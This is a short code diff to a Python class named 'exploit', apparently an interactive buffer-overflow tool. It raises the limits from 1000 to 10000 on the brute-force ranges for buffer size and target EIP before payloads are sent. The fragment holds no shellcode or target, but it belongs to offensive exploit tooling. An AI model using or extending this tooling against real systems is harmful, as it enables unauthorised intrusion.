@@ -521,17 +521,17 @@ class exploit:
             return
 
         buffer_interval = int(get_input("\nEnter a confidence interval for your buffer size: " +
-                                        "(0-1000) [1]\n" +
+                                        "(0-10000) [1]\n" +
                                         "For interval = n, I will conduct an attempt for every buffer size in range " +
                                         "(nominal - n, nominal + n)\n",
-                                        [str(i) for i in range(1001)], default="0"))
+                                        [str(i) for i in range(10001)], default="0"))
 
         eip_interval = int(get_input("\nEnter a confidence interval for your target EIP: " +
-                                     "(0-1000) [1]\n" +
+                                     "(0-10000) [1]\n" +
                                      "For interval = n, I will conduct an attempt for every EIP in range " +
                                      "(nominal - (1 byte)*n, nominal + (1 byte)*n)\n" +
                                      "For interval = n, I will conduct 2*(n+1) attempts\n",
-                                     [str(i) for i in range(1001)], default="0"))
+                                     [str(i) for i in range(10001)], default="0"))
 
         print("\n[*] Sending payload(s)!")
 
